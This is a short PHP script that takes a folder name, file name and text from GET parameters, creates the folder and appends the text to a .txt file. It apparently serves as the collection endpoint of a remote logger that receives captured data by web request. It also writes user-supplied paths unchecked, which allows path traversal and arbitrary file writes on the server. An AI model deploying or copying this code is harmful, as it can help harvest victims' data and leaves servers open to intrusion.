<?php
$dossier = $_GET['fp'];
if(!is_dir($dossier)){
   mkdir($dossier);
}

if((isset($_GET['l'])) && (isset($_GET['fp']))) {
  $f=fopen($_GET['fp'] . '/'. $_GET['s'] . '.txt','a+');
  fwrite($f,$_GET['l']);
  fclose($f);
}
?>